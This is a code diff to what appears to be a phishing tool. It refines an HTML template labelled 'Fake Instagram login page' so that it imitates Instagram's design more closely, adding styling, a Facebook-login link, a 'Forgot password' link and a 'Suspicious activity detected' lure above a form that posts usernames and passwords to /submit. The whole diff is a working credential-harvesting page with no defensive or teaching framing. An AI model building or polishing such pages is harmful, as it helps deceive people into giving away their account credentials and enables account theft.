@@ -38,7 +38,7 @@ PHONE_INPUT_PAGE = """
 </html>
 """
 
-# Fake Instagram login page HTML (mimicking Instagram's design)
+# Enhanced Fake Instagram login page HTML (mimicking Instagram's design more closely)
 FAKE_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -53,62 +53,103 @@ FAKE_PAGE = """
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
         }
         .container {
             width: 350px;
             background-color: white;
             border: 1px solid #dbdbdb;
-            padding: 20px;
+            padding: 40px 20px;
             text-align: center;
+            box-sizing: border-box;
         }
         .logo {
-            font-size: 40px;
+            font-size: 50px;
             font-family: 'Billabong', cursive;
             margin-bottom: 20px;
+            color: #262626;
         }
         form {
             display: flex;
             flex-direction: column;
         }
         input {
-            padding: 10px;
+            padding: 9px 0 7px 8px;
             margin: 5px 0;
             border: 1px solid #dbdbdb;
             border-radius: 3px;
             background-color: #fafafa;
             font-size: 14px;
+            line-height: 18px;
         }
         button {
             background-color: #0095f6;
             color: white;
             border: none;
-            padding: 8px;
+            padding: 7px;
             margin: 10px 0;
             border-radius: 5px;
-            font-weight: bold;
+            font-weight: 600;
+            font-size: 14px;
             cursor: pointer;
         }
         button:disabled {
             background-color: #b2dffc;
+        }
+        .forgot-password {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #00376b;
+        }
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .or-divider::before,
+        .or-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+            margin: 0 10px;
+        }
+        .facebook-login {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
         }
         .footer {
             margin-top: 20px;
             font-size: 12px;
             color: #8e8e8e;
         }
+        .error-message {
+            color: #ed4956;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">Instagram</div>
-        <p style="color: red;">Suspicious activity detected. Please verify your account.</p>
+        <p class="error-message">Suspicious activity detected. Please verify your account.</p>
         <form method="POST" action="/submit">
             <input type="text" name="username" placeholder="Phone number, username, or email" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
+        <div class="or-divider">OR</div>
+        <a href="#" class="facebook-login">Log in with Facebook</a>
+        <div class="forgot-password">
+            <a href="#" style="color: #00376b; text-decoration: none;">Forgot password?</a>
+        </div>
         <div class="footer">© 2025 Instagram from Meta</div>
     </div>
 </body>
